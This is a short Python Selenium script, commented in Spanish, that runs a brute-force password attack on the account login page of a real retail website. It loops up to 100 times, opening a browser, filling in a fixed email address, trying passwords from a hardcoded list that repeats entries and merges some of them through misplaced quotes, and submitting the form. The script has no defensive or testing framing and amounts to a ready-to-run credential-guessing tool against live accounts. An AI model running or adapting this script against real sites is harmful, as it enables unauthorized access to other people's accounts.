from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os
import time

url = "https://www.reebok.cl/account-login"

username = "ejemplocorreo@gmail.com"

#fuerza bruta con 100 intentos

password = ["SerWE3r45", "PereweW45", "Prueba123456789.", "3o23FFes233", "18fFErna1", "2FDFti12", "BaEWWEno12", "MoewW1234", "FRFito1234", "RFFirez2011", "ciesfFF23", "2fsfFarzo2002", "Lawwew12113", "MDWEneea31", "AlmrSa213", 
"Tom21asito", "flacA121958", "LS1ia2533", "mE112ticito10", "123456Jf,SerWE3r45", "PereweW45", "Prueba123456789.", "3o23FFes233", "18fFErna1","2FDFti12", "BaEWWEno12", "MoewW1234", "FRFito1234", "RFFirez2011", 
"ciesfFF23", "2fsfFarzo2002", "Lawwew12113", "MDWEneea31", "AlmrSa213","Tom21asito", "flacA121958", "LS1ia2533", "mE112ticito10", "123456Jf, SerWE3r45", "PereweW45", "Prueba123456789.", "3o23FFes233", "18fFErna1", 
"2FDFti12", "BaEWWEno12", "MoewW1234", "FRFito1234", "RFFirez2011","ciesfFF23", "2fsfFarzo2002", "Lawwew12113", "MDWEneea31", "AlmrSa213","Tom21asito", "flacA121958", "LS1ia2533", "mE112ticito10", "123456Jf, SerWE3r45", "PereweW45", "Prueba123456789.", "3o23FFes233", "18fFErna1", 
"2FDFti12", "BaEWWEno12", "MoewW1234", "FRFito1234", "RFFirez2011", 
"ciesfFF23", "2fsfFarzo2002", "Lawwew12113", "MDWEneea31", "AlmrSa213", 
"Tom21asito", "flacA121958", "LS1ia2533", "mE112ticito10", "123456Jf, SerWE3r45", "PereweW45", "Prueba123456789.", "3o23FFes233", "18fFErna1", 
"2FDFti12", "BaEWWEno12", "MoewW1234", "FRFito1234", "RFFirez2011", 
"ciesfFF23", "2fsfFarzo2002", "Lawwew12113", "MDWEneea31", "AlmrSa213", 
"Tom21asito", "flacA121958", "LS1ia2533", "mE112ticito10", "123456Jf"]

users = 0
while users < 100:

    time.sleep(1)
    driver = webdriver.Chrome()

    url = "https://www.reebok.cl/account-login"

    driver.get(url)

    time.sleep(1)
    driver.find_element_by_id("login-email").send_keys(username)

    time.sleep(1)

    driver.find_element_by_id("login-password").send_keys(password[users])

    time.sleep(1)

    check_box = driver.find_element_by_xpath('//*[@id="app"]/div/div[1]/div/div/div/div[2]/div[1]/form/div[7]/button')
    check_box.click()

    time.sleep(6)

    driver.close()
    users = users + 1

    time.sleep(2)
